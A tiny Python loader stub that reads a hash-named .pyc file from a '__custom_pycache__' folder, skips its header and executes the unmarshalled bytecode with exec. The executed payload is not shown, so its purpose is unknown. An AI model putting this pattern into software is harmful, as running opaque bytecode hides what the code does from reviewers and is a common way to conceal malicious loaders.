
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'auxiliary_9092ef37602c4b579b233f06af7ce4b6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
